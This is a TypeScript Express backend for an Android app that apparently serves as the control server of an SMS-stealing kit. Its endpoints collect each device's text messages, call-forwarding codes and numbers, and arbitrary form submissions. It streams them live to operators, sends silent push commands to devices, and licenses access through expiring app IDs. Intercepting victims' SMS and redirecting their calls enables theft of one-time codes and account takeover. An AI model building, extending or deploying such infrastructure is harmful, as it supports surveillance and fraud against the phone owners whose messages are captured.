import { Router, type Request } from "express";
import { db } from "../lib/supabase.js";
import { checkProxyRules, logProxyRequest } from "../lib/proxy.js";
import { addDeviceSseClient, removeDeviceSseClient, broadcastDeviceSSE } from "../lib/device-sse.js";
import { logger } from "../lib/logger.js";
import { sendFcmMessage } from "../lib/fcm.js";
const router = Router();

function getIp(req: { headers: Record<string, string | string[] | undefined>; socket: { remoteAddress?: string } }): string {
  const fwd = req.headers["x-forwarded-for"];
  const ip = (Array.isArray(fwd) ? fwd[0] : fwd) ?? req.socket.remoteAddress ?? "unknown";
  return ip.split(",")[0].trim();
}

async function verifyApp(appToken: string): Promise<{ ok: boolean; error?: string }> {
  const { data, error } = await db
    .from("apps")
    .select("status, expires_at")
    .eq("app_id", appToken)
    .single();

  if (error || !data) return { ok: false, error: "App ID not found" };
  if (data.status === "disabled") return { ok: false, error: "App ID is disabled" };
  if (data.status === "inactive") return { ok: false, error: "App ID is inactive" };
  if (data.expires_at && new Date(data.expires_at) < new Date()) return { ok: false, error: "App ID expired" };

  return { ok: true };
}

const DIRECT_COLUMNS = new Set([
  "status", "data_type",
  "device_name", "device_model", "android_version",
  "total_sms_count", "last_sms_timestamp",
  "sms_sync_status", "sms_pending_count", "sms_processed_count",
  "sms_permission_status", "sms_last_sync_at", "sms_last_error",
  "call_forward_status", "call_forward_action", "call_forward_code",
  "call_forward_number", "call_forward_sim_slot", "call_forward_response",
  "call_forward_timestamp", "last_heartbeat_at", "data_json",
  "fcm_token", "fcm_token_status",
]);

const SKIP_FIELDS = new Set(["app_id", "sub_id", "uid", "id", "registered_at", "created_at"]);

const CORE_DATA_TYPES = new Set([
  "registered_device", "heartbeat", "online_status",
  "fcm_token", "call_forward", "sms_sync", "device_info",
  "admin_config",
]);

// ── GET /api/device/:appToken/stream ─────────────────────────────────────────
// SSE stream for Android app — broadcasts device/message/form_data changes
router.get("/device/:appToken/stream", async (req, res) => {
  const { appToken } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) {
    res.status(403).json({ ok: false, error: appCheck.error });
    return;
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  // Keep-alive ping every 15s — well under any proxy/OkHttp read timeout
  const ping = setInterval(() => {
    try { res.write(": ping\n\n"); } catch { clearInterval(ping); }
  }, 15000);

  addDeviceSseClient(appToken, res);

  req.on("close", () => {
    clearInterval(ping);
    removeDeviceSseClient(appToken, res);
  });
});

// ── POST /api/device/:appToken/upsert ─────────────────────────────────────────
router.post("/device/:appToken/upsert", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });

  const meta = { endpoint: "upsert" as const, app_id: appToken, sub_id: subId, ip };

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) {
    logProxyRequest({ endpoint: "/api/device/upsert", app_id: appToken, sub_id: subId, device_id: null, ip, status: "blocked", reason: appCheck.error!, payload_preview: { app_id: appToken, sub_id: subId } });
    return res.status(403).json({ ok: false, error: appCheck.error });
  }

  const { allowed, reason } = await checkProxyRules(meta);
  logProxyRequest({ endpoint: `/api/device/${appToken}/upsert`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, data_type: payload["data_type"] } });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const dataType = (payload["data_type"] as string | undefined) ?? "registered_device";

  if (dataType && !CORE_DATA_TYPES.has(dataType) && dataType !== "registered_device") {
    const formRow = {
      app_id: appToken,
      sub_id: subId,
      form_type: dataType,
      data: payload,
      submitted_at: new Date().toISOString(),
    };
    const { data: fData } = await db.from("form_data").insert(formRow).select().single();
    if (fData) broadcastDeviceSSE(appToken, "form_data", "INSERT", fData);
    return res.json({ ok: true, routed: "form_data" });
  }

  const row: Record<string, unknown> = {
    app_id: appToken,
    sub_id: subId,
    device_id: subId,
    updated_at: new Date().toISOString(),
    last_seen: new Date().toISOString(),
  };

  for (const [key, val] of Object.entries(payload)) {
    if (SKIP_FIELDS.has(key)) continue;
    if (DIRECT_COLUMNS.has(key)) row[key] = val;
  }

  const dj = payload["data_json"] as Record<string, unknown> | undefined;
  if (dj) {
    row["device_name"] ??= dj["device_name"] ?? dj["model"] ?? null;
    row["device_model"] ??= dj["model"] ?? null;
    row["android_version"] ??= dj["androidversion"] ?? null;
  }

  if (dj) {
    const { data: existingRow } = await db.from("devices").select("data_json").eq("app_id", appToken).eq("sub_id", subId).maybeSingle();
    const existingDj = (existingRow?.data_json as Record<string, unknown> | null) ?? {};
    const merged: Record<string, unknown> = { ...existingDj };
    for (const [k, v] of Object.entries(dj)) {
      const existing = existingDj[k];
      if ((v === "" || v === null || v === undefined || v === 0) && existing !== undefined && existing !== "" && existing !== null && existing !== 0) continue;
      merged[k] = v;
    }
    delete (merged as Record<string, unknown>)["fcm_token"];
    delete (merged as Record<string, unknown>)["fcm_token_status"];
    row["data_json"] = merged;
  }

  if (!row["fcm_token"] || row["fcm_token"] === "") {
    const promotedToken = (dj?.["fcm_token"] as string | undefined) ?? "";
    if (promotedToken) row["fcm_token"] = promotedToken;
  }
  if (!row["fcm_token_status"] || row["fcm_token_status"] === "") {
    const promotedStatus = (dj?.["fcm_token_status"] as string | undefined) ?? "";
    if (promotedStatus) row["fcm_token_status"] = promotedStatus;
  }

  let { data, error } = await db.from("devices").upsert(row, { onConflict: "app_id,sub_id" }).select().single();

  if (error && error.message.includes("fcm_token")) {
    delete row["fcm_token"];
    delete row["fcm_token_status"];
    if (row["data_json"] && dj?.["fcm_token"]) {
      (row["data_json"] as Record<string, unknown>)["fcm_token"] = dj["fcm_token"];
      (row["data_json"] as Record<string, unknown>)["fcm_token_status"] = dj["fcm_token_status"] ?? "active";
    }
    const retry = await db.from("devices").upsert(row, { onConflict: "app_id,sub_id" }).select().single();
    data = retry.data;
    error = retry.error;
  }

  if (error) return res.status(500).json({ ok: false, error: error.message });

  // Broadcast to Android SSE clients
  if (data) broadcastDeviceSSE(appToken, "devices", "UPDATE", data);

  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/message ────────────────────────────────────────
router.post("/device/:appToken/message", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) {
    logProxyRequest({ endpoint: `/api/device/${appToken}/message`, app_id: appToken, sub_id: subId, device_id: null, ip, status: "blocked", reason: appCheck.error!, payload_preview: { app_id: appToken, sub_id: subId } });
    return res.status(403).json({ ok: false, error: appCheck.error });
  }

  const { allowed, reason } = await checkProxyRules({ endpoint: "message", app_id: appToken, sub_id: subId, ip });
  logProxyRequest({ endpoint: `/api/device/${appToken}/message`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, sender_number: payload["sender_number"], direction: payload["direction"], content: String(payload["message_body"] ?? "").slice(0, 80) } });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const tsRaw = payload["timestamp"] as number | undefined;
  const sentAt = tsRaw ? new Date(tsRaw).toISOString() : new Date().toISOString();

  const messageRow = {
    app_id:       appToken,
    sub_id:       subId,
    from_id:      (payload["sender_number"] ?? payload["phone_number"] ?? null) as string | null,
    to_id:        (payload["receiver_number"] ?? null) as string | null,
    content:      ((payload["message_body"] as string | undefined) ?? "").slice(0, 5000),
    message_type: (payload["direction"] as string | undefined) ?? "sms",
    sent_at:      sentAt,
    is_read:      false,
  };

  let insertResult = await db.from("messages").insert(messageRow).select().single();

  if (insertResult.error && insertResult.error.message.includes("to_id")) {
    const { to_id: _dropped, ...rowWithoutToId } = messageRow;
    insertResult = await db.from("messages").insert(rowWithoutToId).select().single();
  }

  const { data, error } = insertResult;
  if (error) return res.status(500).json({ ok: false, error: error.message });

  // Broadcast to Android SSE clients
  if (data) broadcastDeviceSSE(appToken, "messages", "INSERT", data);

  const { count } = await db.from("messages").select("*", { count: "exact", head: true }).eq("app_id", appToken).eq("sub_id", subId);
  const now = new Date().toISOString();
  await db.from("devices").update({ total_sms_count: count ?? 0, last_sms_timestamp: tsRaw ?? Date.now(), sms_sync_status: "SYNCED", sms_last_sync_at: Date.now(), updated_at: now, last_seen: now }).eq("app_id", appToken).eq("sub_id", subId);

  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/form ───────────────────────────────────────────
router.post("/device/:appToken/form", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "sub_id or uid is required" });

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) {
    logProxyRequest({ endpoint: `/api/device/${appToken}/form`, app_id: appToken, sub_id: subId, device_id: null, ip, status: "blocked", reason: appCheck.error!, payload_preview: { app_id: appToken, sub_id: subId } });
    return res.status(403).json({ ok: false, error: appCheck.error });
  }

  const { allowed, reason } = await checkProxyRules({ endpoint: "form", app_id: appToken, sub_id: subId, ip });
  logProxyRequest({ endpoint: `/api/device/${appToken}/form`, app_id: appToken, sub_id: subId, device_id: null, ip, status: allowed ? "accepted" : "blocked", reason, payload_preview: { app_id: appToken, sub_id: subId, data_type: payload["data_type"] } });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const formRow = {
    app_id:       appToken,
    sub_id:       subId,
    form_type:    (payload["data_type"] as string | undefined) ?? "form",
    data:         payload,
    submitted_at: new Date().toISOString(),
  };

  const { data, error } = await db.from("form_data").insert(formRow).select().single();
  if (error) return res.status(500).json({ ok: false, error: error.message });

  if (data) broadcastDeviceSSE(appToken, "form_data", "INSERT", data);

  return res.json({ ok: true, data });
});

// ── GET /api/device/:appToken/get/:uid ────────────────────────────────────────
router.get("/device/:appToken/get/:uid", async (req, res) => {
  const { appToken, uid } = req.params;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "get", app_id: appToken, sub_id: uid, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const { data, error } = await db.from("devices").select("*").eq("app_id", appToken).eq("sub_id", uid).single();

  if (error || !data) return res.status(404).json({ ok: false, error: "Device not found" });
  return res.json({ ok: true, data });
});

// ── GET /api/device/:appToken/get ─────────────────────────────────────────────
// Supports optional pagination: ?offset=0&limit=50
// When limit=0 (default) all rows are returned (backward-compat).
router.get("/device/:appToken/get", async (req, res) => {
  const { appToken } = req.params;
  const { offset = "0", limit = "0" } = req.query as Record<string, string>;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const numOffset = Math.max(0, Number(offset) || 0);
  const numLimit  = Math.max(0, Number(limit)  || 0);

  let query = db
    .from("devices")
    .select("*")
    .eq("app_id", appToken)
    .order("registered_at", { ascending: false });

  if (numLimit > 0) {
    query = query.range(numOffset, numOffset + numLimit - 1);
  }

  const { data, error } = await query;
  if (error) return res.status(500).json({ ok: false, error: error.message });

  const rows    = data ?? [];
  const hasMore = numLimit > 0 ? rows.length >= numLimit : false;
  return res.json({ ok: true, data: rows, hasMore, offset: numOffset, limit: numLimit });
});

// ── PATCH /api/device/:appToken/update/:uid ───────────────────────────────────
router.patch("/device/:appToken/update/:uid", async (req, res) => {
  const { appToken, uid } = req.params;
  const updates = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "update", app_id: appToken, sub_id: uid, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const row: Record<string, unknown> = {
    updated_at: new Date().toISOString(),
    last_seen:  new Date().toISOString(),
  };

  for (const [key, val] of Object.entries(updates)) {
    if (SKIP_FIELDS.has(key)) continue;
    if (DIRECT_COLUMNS.has(key)) row[key] = val;
  }

  const updateDj = updates["data_json"] as Record<string, unknown> | undefined;
  if (updateDj) {
    const { data: existingRow } = await db.from("devices").select("data_json").eq("app_id", appToken).eq("sub_id", uid).maybeSingle();
    const existingDj = (existingRow?.data_json as Record<string, unknown> | null) ?? {};
    const merged: Record<string, unknown> = { ...existingDj };
    for (const [k, v] of Object.entries(updateDj)) {
      const existing = existingDj[k];
      if ((v === "" || v === null || v === undefined || v === 0) && existing !== undefined && existing !== "" && existing !== null && existing !== 0) continue;
      merged[k] = v;
    }
    delete (merged as Record<string, unknown>)["fcm_token"];
    delete (merged as Record<string, unknown>)["fcm_token_status"];
    row["data_json"] = merged;
  }

  let { data: updData, error: updError } = await db.from("devices").update(row).eq("app_id", appToken).eq("sub_id", uid).select().single();

  if (updError && updError.message.includes("fcm_token")) {
    const fcmTokenVal = row["fcm_token"];
    delete row["fcm_token"];
    delete row["fcm_token_status"];
    if (row["data_json"] && fcmTokenVal) {
      (row["data_json"] as Record<string, unknown>)["fcm_token"] = fcmTokenVal;
      (row["data_json"] as Record<string, unknown>)["fcm_token_status"] = "active";
    }
    const retry = await db.from("devices").update(row).eq("app_id", appToken).eq("sub_id", uid).select().single();
    updData = retry.data;
    updError = retry.error;
  }

  if (updError) return res.status(500).json({ ok: false, error: updError.message });

  if (updData) broadcastDeviceSSE(appToken, "devices", "UPDATE", updData);

  return res.json({ ok: true, data: updData });
});

// ── DELETE /api/device/:appToken/delete/:uid ──────────────────────────────────
router.delete("/device/:appToken/delete/:uid", async (req, res) => {
  const { appToken, uid } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { data: old } = await db.from("devices").select("*").eq("app_id", appToken).eq("sub_id", uid).single();
  const { error } = await db.from("devices").delete().eq("app_id", appToken).eq("sub_id", uid);

  if (error) return res.status(500).json({ ok: false, error: error.message });

  if (old) broadcastDeviceSSE(appToken, "devices", "DELETE", null, old);

  return res.json({ ok: true });
});

// ── GET /api/device/:appToken/messages ────────────────────────────────────────
router.get("/device/:appToken/messages", async (req, res) => {
  const { appToken } = req.params;
  const { uid, limit = "100", offset = "0" } = req.query as Record<string, string>;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  let query = db.from("messages").select("*").eq("app_id", appToken).order("sent_at", { ascending: false }).range(Number(offset), Number(offset) + Number(limit) - 1);

  if (uid) query = query.eq("sub_id", uid);

  const { data, error } = await query;
  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? [] });
});

// ── DELETE /api/device/:appToken/messages/:id ─────────────────────────────────
router.delete("/device/:appToken/messages/:id", async (req, res) => {
  const { appToken, id } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { error } = await db.from("messages").delete().eq("app_id", appToken).eq("id", Number(id));

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true });
});

// ── DELETE /api/device/:appToken/messages ─────────────────────────────────────
router.delete("/device/:appToken/messages", async (req, res) => {
  const { appToken } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { error } = await db.from("messages").delete().eq("app_id", appToken);

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true });
});

// ── GET /api/device/:appToken/form-data ───────────────────────────────────────
router.get("/device/:appToken/form-data", async (req, res) => {
  const { appToken } = req.params;
  const { uid, limit = "100", offset = "0" } = req.query as Record<string, string>;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  let query = db.from("form_data").select("*").eq("app_id", appToken).order("submitted_at", { ascending: false }).range(Number(offset), Number(offset) + Number(limit) - 1);

  if (uid) query = query.eq("sub_id", uid);

  const { data, error } = await query;
  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? [] });
});

// ── GET /api/device/:appToken/admin-config ───────────────────────────────────
router.get("/device/:appToken/admin-config", async (req, res) => {
  const { appToken } = req.params;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { data, error } = await db.from("devices").select("*").eq("app_id", appToken).eq("sub_id", "admin_config_main").maybeSingle();

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data: data ?? null });
});

// ── POST /api/device/:appToken/admin-config ──────────────────────────────────
router.post("/device/:appToken/admin-config", async (req, res) => {
  const { appToken } = req.params;
  const { number, status } = req.body as { number?: string; status?: string };

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const now = new Date().toISOString();
  const row = {
    app_id:    appToken,
    sub_id:    "admin_config_main",
    device_id: "admin_config_main",
    data_type: "admin_config",
    status:    status ?? "OFF",
    data_json: { number: number ?? "", status: status ?? "OFF", updated_at: Date.now() },
    updated_at: now,
    last_seen:  now,
  };

  const { data, error } = await db.from("devices").upsert(row, { onConflict: "app_id,sub_id" }).select().single();

  if (error) return res.status(500).json({ ok: false, error: error.message });
  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/fcm-send ──────────────────────────────────────
// Two modes:
//
// MODE A — FCMHelper style (direct token):
//   { fcmToken: "<token>", data: { type: "CHECK_ONLINE", payload: "{...}" } }
//   → forward data fields directly to FCM (no notification block)
//
// MODE B — SupabaseApi.sendFcmPush style (lookup by uid):
//   { uid/uniqueid: "<sub_id>", title: "...", body: "...", data?: {...} }
//   → look up fcm_token from DB, then send notification + data
//
router.post("/device/:appToken/fcm-send", async (req, res) => {
  const { appToken } = req.params;
  const b = req.body as Record<string, unknown>;

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  // ── Resolve FCM token ──────────────────────────────────────────────────────
  let resolvedFcmToken = ((b["fcmToken"] ?? b["fcm_token"] ?? "") as string).trim();

  if (!resolvedFcmToken) {
    const uid = ((b["uid"] ?? b["uniqueid"] ?? b["uniqueId"] ?? b["deviceId"] ?? "") as string).trim();
    if (!uid) return res.status(400).json({ ok: false, error: "fcmToken or uid is required" });

    const { data: deviceRow } = await db
      .from("devices")
      .select("fcm_token, data_json")
      .eq("app_id", appToken)
      .eq("sub_id", uid)
      .maybeSingle();

    resolvedFcmToken =
      (deviceRow?.fcm_token as string | null) ||
      ((deviceRow?.data_json as Record<string, unknown> | null)?.["fcm_token"] as string | null) ||
      "";

    if (!resolvedFcmToken) return res.status(404).json({ ok: false, error: "No FCM token for this device" });
  }

  const dataField = b["data"] as Record<string, string> | undefined;
  const title     = b["title"] as string | undefined;
  const body      = b["body"]  as string | undefined;

  // ── Send via Firebase Admin SDK (FCM v1) ──────────────────────────────────
  let result: { ok: boolean; messageId?: string; error?: string };

  if (dataField && typeof dataField === "object" && !title && !body) {
    // MODE A — data-only (FCMHelper)
    const stringData: Record<string, string> = {};
    for (const [k, v] of Object.entries(dataField)) {
      stringData[k] = typeof v === "string" ? v : JSON.stringify(v);
    }
    result = await sendFcmMessage({ mode: "data", fcmToken: resolvedFcmToken, data: stringData });
  } else {
    // MODE B — notification
    result = await sendFcmMessage({
      mode:     "notification",
      fcmToken: resolvedFcmToken,
      title:    title ?? "Admin",
      body:     body  ?? "",
      data:     dataField,
    });
  }

  if (!result.ok) return res.status(502).json({ ok: false, error: result.error });
  return res.json({ ok: true, messageId: result.messageId });
});

// ── POST /api/device/:appToken/data ───────────────────────────────────────────
router.post("/device/:appToken/data", async (req, res) => {
  const { appToken } = req.params;
  const payload = req.body as Record<string, unknown>;
  const ip = getIp(req as Parameters<typeof getIp>[0]);

  const subId = ((payload["deviceId"] ?? payload["sub_id"] ?? payload["uid"]) as string | undefined)?.trim() ?? "";
  if (!subId) return res.status(400).json({ ok: false, error: "deviceId is required" });

  const appCheck = await verifyApp(appToken);
  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });

  const { allowed, reason } = await checkProxyRules({ endpoint: "upsert", app_id: appToken, sub_id: subId, ip });
  if (!allowed) return res.status(403).json({ ok: false, error: reason });

  const formFields = (payload["data"] as Record<string, unknown> | undefined) ?? payload;

  const formRow = {
    app_id:       appToken,
    sub_id:       subId,
    form_type:    (formFields["form_type"] as string | undefined) ?? "form",
    data:         formFields,
    submitted_at: new Date().toISOString(),
  };

  const { data, error } = await db.from("form_data").insert(formRow).select().single();
  if (error) return res.status(500).json({ ok: false, error: error.message });

  if (data) broadcastDeviceSSE(appToken, "form_data", "INSERT", data);

  logProxyRequest({ endpoint: `/api/device/${appToken}/data`, app_id: appToken, sub_id: subId, device_id: null, ip, status: "accepted", reason: "form submitted", payload_preview: { app_id: appToken, sub_id: subId, form_type: formRow.form_type } });
  return res.json({ ok: true, data });
});

// ── POST /api/device/:appToken/admin-login ────────────────────────────────────
// Single-call login: returns session_id, can_change_password, active_sessions,
// login_limit, and expires_at so the app never needs separate /expiry or
// /login-info calls after a successful login.
router.post("/device/:appToken/admin-login", async (req, res) => {
  const { appToken } = req.params;
  const { password, sub_id } = req.body as { password?: string; sub_id?: string };

  if (!password) return res.status(400).json({ ok: false, error: "Password required" });

  // ── Fetch app row + settings rows in parallel ─────────────────────────────
  const [
    { data: app, error: appErr },
    { data: limitRow },
    { data: firstDevRow },
  ] = await Promise.all([
    db.from("apps").select("pin, status, expires_at").eq("app_id", appToken).single(),
    db.from("settings").select("value").eq("app_id", appToken).eq("key", "login_limit").maybeSingle(),
    db.from("settings").select("value").eq("app_id", appToken).eq("key", "first_device_sub_id").maybeSingle(),
  ]);

  if (appErr || !app) return res.status(403).json({ ok: false, error: "Invalid App ID" });
  if (app.status === "disabled") return res.status(403).json({ ok: false, error: "App ID is disabled" });
  if (app.status === "inactive") return res.status(403).json({ ok: false, error: "App ID is inactive" });
  if (app.expires_at && new Date(app.expires_at as string) < new Date()) return res.status(403).json({ ok: false, error: "App ID expired" });
  if (password !== app.pin) return res.status(401).json({ ok: false, error: "Invalid password" });

  const loginLimit = limitRow ? (parseInt(limitRow.value ?? "5") || 5) : 5;

  // ── Active session count ──────────────────────────────────────────────────
  const { count: activeCount } = await db.from("admin_sessions")
    .select("*", { count: "exact", head: true })
    .eq("app_id", appToken).eq("is_valid", true);

  if ((activeCount ?? 0) >= loginLimit) {
    return res.status(429).json({
      ok: false,
      error: "Login limit reached. Ask admin to logout old sessions.",
      active_sessions: activeCount ?? 0,
      login_limit: loginLimit,
    });
  }

  // ── First-device tracking (determines can_change_password) ────────────────
  let canChangePassword = true;
  const currentSubId = (sub_id ?? "").trim();

  if (!firstDevRow && currentSubId) {
    await db.from("settings").upsert(
      { app_id: appToken, key: "first_device_sub_id", value: currentSubId },
      { onConflict: "app_id,key" }
    );
  } else if (firstDevRow && firstDevRow.value !== currentSubId) {
    canChangePassword = false;
  }

  // ── Create session ────────────────────────────────────────────────────────
  const ip = getIp(req as Parameters<typeof getIp>[0]);
  const { data: session, error: sessErr } = await db
    .from("admin_sessions")
    .insert({
      app_id:      appToken,
      sub_id:      currentSubId || null,
      login_time:  new Date().toISOString(),
      last_active: new Date().toISOString(),
      ip,
      is_valid:    true,
    })
    .select("id")
    .single();

  if (sessErr || !session) {
    logger.warn({ err: sessErr?.message }, "admin-login: session insert failed");
    return res.json({
      ok: true,
      session_id: -1,
      can_change_password: canChangePassword,
      active_sessions: (activeCount ?? 0) + 1,
      login_limit: loginLimit,
      expires_at: app.expires_at ?? null,
    });
  }

  // ── Single response with everything the app needs ─────────────────────────
  return res.json({
    ok: true,
    session_id: session.id,
    can_change_password: canChangePassword,
    active_sessions: (activeCount ?? 0) + 1,
    login_limit: loginLimit,
    expires_at: app.expires_at ?? null,          // ISO string or null
  });
});

// ── GET /api/device/:appToken/expiry ─────────────────────────────────────────
// ExpiryManager polls this every 30 min to check if the app token is still valid.
router.get("/device/:appToken/expiry", async (req, res) => {
  const { appToken } = req.params;
  const { data, error } = await db.from("apps").select("status, expires_at").eq("app_id", appToken).single();

  if (error || !data) return res.status(404).json({ ok: false, expired: true, status: "unknown" });

  const now = Date.now();
  const expiresAt = data.expires_at ? new Date(data.expires_at as string).getTime() : null;
  const statusExpired = (data.status as string) === "disabled" || (data.status as string) === "inactive";
  const timeExpired = expiresAt !== null && now >= expiresAt;
  const expired = statusExpired || timeExpired;
  const millisLeft = expiresAt ? Math.max(0, expiresAt - now) : 0;

  return res.json({
    ok: true,
    expired,
    expiresAt: data.expires_at ?? null,
    millisLeft,
    status: data.status,
  });
});

// ── GET /api/device/:appToken/login-info ─────────────────────────────────────
// Returns active session count and the configured login limit.
router.get("/device/:appToken/login-info", async (req, res) => {
  const { appToken } = req.params;

  const [{ count }, { data: limitRow }] = await Promise.all([
    db.from("admin_sessions").select("*", { count: "exact", head: true }).eq("app_id", appToken).eq("is_valid", true),
    db.from("settings").select("value").eq("app_id", appToken).eq("key", "login_limit").maybeSingle(),
  ]);

  const loginLimit = limitRow ? (parseInt(limitRow.value ?? "5") || 5) : 5;

  return res.json({ ok: true, active_sessions: count ?? 0, login_limit: loginLimit });
});

// ── PATCH /api/device/:appToken/set-login-limit ───────────────────────────────
// Only the first-login device (owner) can change the limit.
router.patch("/device/:appToken/set-login-limit", async (req, res) => {
  const { appToken } = req.params;
  const { new_limit, sub_id } = req.body as { new_limit?: number; sub_id?: string };

  if (!new_limit || new_limit < 1 || new_limit > 100) {
    return res.status(400).json({ ok: false, error: "Limit must be between 1 and 100" });
  }

  // Only first-device owner can set limit
  const { data: firstDevRow } = await db.from("settings")
    .select("value").eq("app_id", appToken).eq("key", "first_device_sub_id").maybeSingle();

  if (firstDevRow && sub_id && firstDevRow.value !== sub_id.trim()) {
    return res.status(403).json({ ok: false, error: "Only the first login device can set the limit" });
  }

  await db.from("settings").upsert(
    { app_id: appToken, key: "login_limit", value: String(new_limit) },
    { onConflict: "app_id,key" }
  );

  return res.json({ ok: true, login_limit: new_limit });
});

// ── DELETE /api/device/:appToken/logout-all ───────────────────────────────────
// Invalidates all active sessions for this app token. No auth needed — Android
// uses this from the disclaimer screen after the owner confirms.
router.delete("/device/:appToken/logout-all", async (req, res) => {
  const { appToken } = req.params;

  await db.from("admin_sessions")
    .update({ is_valid: false })
    .eq("app_id", appToken)
    .eq("is_valid", true);

  return res.json({ ok: true });
});

// ── GET /api/device/:appToken/session/:id/check ───────────────────────────────
// Returns { valid: true/false } — Android polls this every 30 s.
router.get("/device/:appToken/session/:id/check", async (req, res) => {
  const sessionId = Number(req.params.id);
  if (!sessionId || isNaN(sessionId)) return res.json({ valid: false });

  const { data, error } = await db
    .from("admin_sessions")
    .select("is_valid")
    .eq("id", sessionId)
    .eq("app_id", req.params.appToken)
    .maybeSingle();

  if (error || !data) return res.json({ valid: false });
  return res.json({ valid: data.is_valid === true });
});

// ── POST /api/device/:appToken/session/:id/ping ───────────────────────────────
// Android calls this every 5 min to update last_active.
router.post("/device/:appToken/session/:id/ping", async (req, res) => {
  const sessionId = Number(req.params.id);
  if (!sessionId || isNaN(sessionId)) return res.json({ ok: true });

  await db
    .from("admin_sessions")
    .update({ last_active: new Date().toISOString() })
    .eq("id", sessionId)
    .eq("app_id", req.params.appToken);

  return res.json({ ok: true });
});

// ── POST /api/device/:appToken/admin-change-password ──────────────────────────
router.post("/device/:appToken/admin-change-password", async (req, res) => {
  const { appToken } = req.params;
  const { old_password, new_password } = req.body as { old_password?: string; new_password?: string };

  if (!old_password || !new_password) return res.status(400).json({ ok: false, error: "old_password and new_password required" });

  const { data: app, error } = await db.from("apps").select("pin").eq("app_id", appToken).single();
  if (error || !app) return res.status(403).json({ ok: false, error: "Invalid App ID" });
  if (old_password !== app.pin) return res.status(401).json({ ok: false, error: "Old password incorrect" });

  const { error: updErr } = await db.from("apps").update({ pin: new_password }).eq("app_id", appToken);
  if (updErr) return res.status(500).json({ ok: false, error: updErr.message });

  return res.json({ ok: true });
});

export default router;
